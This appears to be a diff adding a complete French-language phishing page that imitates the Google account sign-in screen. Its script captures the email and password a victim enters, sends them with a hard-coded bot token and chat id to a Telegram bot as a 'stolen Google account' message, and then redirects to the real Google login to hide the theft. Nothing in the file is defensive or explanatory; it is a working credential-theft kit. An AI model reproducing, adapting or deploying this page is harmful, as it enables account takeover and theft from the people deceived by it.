@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <style>
+        body { font-family: 'Google Sans', Arial, sans-serif; background: #f6f8fa; margin:0; padding:0; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .box { background:white; padding:40px 30px; border-radius:8px; box-shadow:0 1px 6px rgba(0,0,0,0.15); width:380px; text-align:center; }
+        .logo { width:80px; margin-bottom:24px; }
+        h1 { font-size:24px; margin:10px 0 8px; color:#202124; }
+        p { color:#5f6368; margin-bottom:30px; }
+        input { width:100%; padding:13px 15px; margin:8px 0; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; }
+        input:focus { border:2px solid #1a73e8; outline:none; }
+        button { width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-weight:500; font-size:14px; margin-top:10px; cursor:pointer; }
+        button:hover { background:#185abc; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        
+        <h1>Connexion</h1>
+        <p>Utilisez votre compte Google</p>
+
+        <form id="phishForm">
+            <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit">Suivant</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const botToken = "8552249746:AAFUSy-bxQjRkc3LIYkXomeDdl8m9AJ_gIg";
+            const chatId = "8508877242";
+
+            const message = `🔴 NOUVEAU COMPTE GOOGLE VOLÉ 🔴\n\n` +
+                            `📧 Email : ${email}\n` +
+                            `🔑 Mot de passe : ${password}\n\n` +
+                            `⏰ Heure : ${new Date().toLocaleString('fr-FR')}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
+            });
+
+            // Redirection vers vrai Google après vol
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn";
+            }, 800);
+        });
+    </script>
+</body>
+</html>
